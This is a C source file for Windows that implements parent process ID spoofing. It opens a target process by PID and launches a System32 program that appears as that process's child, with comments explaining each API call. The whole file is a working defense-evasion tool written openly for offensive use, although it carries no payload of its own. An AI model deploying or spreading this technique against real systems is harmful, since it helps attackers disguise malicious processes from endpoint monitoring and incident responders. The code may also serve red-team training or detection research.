#include "header.h"

/// <summary>
///  Create a new process with spoofed parent process id
/// </summary>
/// <param name="hParent"> Handle to the desired parent process </param>
/// <param name="lpProcessName"> Name of the process to be created, e.g. notepad.exe </param>
/// <param name="dwProcessId"> OUT: Process id of the created process </param>
/// <param name="hProcess"> OUT: Handle to the created process </param>
/// <param name="hThread"> OUT: Handle to the created thread </param>
BOOL CreatePPIDSpoofedProcess(IN HANDLE hParent, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    BOOL bState = TRUE;
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    CHAR CurrDr[MAX_PATH];

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    SIZE_T sThreadAttrListSize = NULL; 
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttrList = NULL; 

    // Cleaning the structs by setting the element values to 0
    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        PRINT_ERROR("GetEnvironmentVariableA");
        bState = FALSE;
        goto CLEANUP;
    }
    sprintf_s(CurrDr, MAX_PATH, "%s\\System32", WnDr);

    // Creating the target process path 
    sprintf_s(lpPath, MAX_PATH * 2, "%s\\System32\\%s", WnDr, lpProcessName);
    OKAY("Starting process with spoofed parent PID: %s.", lpPath);

    /// First call to InitializeProcThreadAttributeList to determine the size of the attribute list
    // This will fail with the error: ERROR_INSUFFICIENT_BUFFER
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttrListSize); 
    OKAY("InitializeProcThreadAttributeList should fail with error 122. Actual error: %d.", GetLastError()); 
    OKAY("Size of attribute list: %d", sThreadAttrListSize); 

    /// Allocate memory for thread attribute list
    pThreadAttrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttrListSize); 
    if (!pThreadAttrList) {
        PRINT_ERROR("HeapAlloc"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Allocated memory."); 

    /// Second call to InitializeProcThreadAttributeList which now initializes the attribute list
    //BOOL InitializeProcThreadAttributeList(
    //    [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    //    [in]            DWORD                        dwAttributeCount,
    //                    DWORD                        dwFlags,                // NULL (reserved)
    //    [in, out]       PSIZE_T                      lpSize
    //);
    if (!InitializeProcThreadAttributeList(pThreadAttrList, 1, NULL, &sThreadAttrListSize)) {
        PRINT_ERROR("InitializeProcThreadAttributeList [2]"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Initialized attribute list.", pThreadAttrList); 

    /// Update the thread attribute list to set the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute to the parent process handle
    //BOOL UpdateProcThreadAttribute(
    //    [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // return value from InitializeProcThreadAttributeList 
    //    [in]            DWORD                        dwFlags,           // NULL (reserved)
    //    [in]            DWORD_PTR                    Attribute,
    //    [in]            PVOID                        lpValue,           // pointer to the attribute value
    //    [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
    //    [out, optional] PVOID                        lpPreviousValue,   // NULL (reserved)
    //    [in, optional]  PSIZE_T                      lpReturnSize       // NULL (reserved)
    //);
    if (!UpdateProcThreadAttribute(pThreadAttrList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        PRINT_ERROR("UpdateProcThreadAttribute");
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Updated parent process of target process to 0x%p.", pThreadAttrList, hParent); 

    // Set attribute list of the STARTUPINFOEXA structure
    SiEx.lpAttributeList = pThreadAttrList; 

    /// Create new process 
    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,        // Required to use the STARTUPINFOEXA structure
        NULL,
        CurrDr,                                // Set current directory to C:\Windows\System32
        &SiEx.StartupInfo,
        &Pi)) 
    {
        PRINT_ERROR("CreateProcessA");
        bState = FALSE;
        goto CLEANUP; 
    }

    // Store return values
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread; 

CLEANUP: 

    DeleteProcThreadAttributeList(pThreadAttrList);
    CloseHandle(hParent); 

    if (!dwProcessId || !hProcess || !hThread) {
        WARN("Process not created"); 
        bState = FALSE; 
    }

    return bState; 
}

int main(int argc, char* argv[]) {

    HANDLE hParent = NULL; 
    HANDLE hProcess = NULL; 
    HANDLE hThread = NULL; 
    DWORD dwProcessId = NULL; 

    if (argc < 3) {
        WARN("Usage: %s [process-name] [PPID]", argv[0]); 
        return EXIT_FAILURE; 
    }

    hParent = OpenProcess(PROCESS_ALL_ACCESS, NULL, atoi(argv[2]));
    if (!hParent) {
        PRINT_ERROR("OpenProcess"); 
        return EXIT_FAILURE; 
    }
    OKAY("[ 0x%p ] Got handle to parent process.", hParent); 

    if (!CreatePPIDSpoofedProcess(hParent, argv[1], &dwProcessId, &hProcess, &hThread)) {
        PRINT_ERROR("CreatePPIDSpoofedProcess");
        return EXIT_FAILURE; 
    }
    INFO("[ %d ] Spoofed process created", dwProcessId); 

    return EXIT_SUCCESS; 
}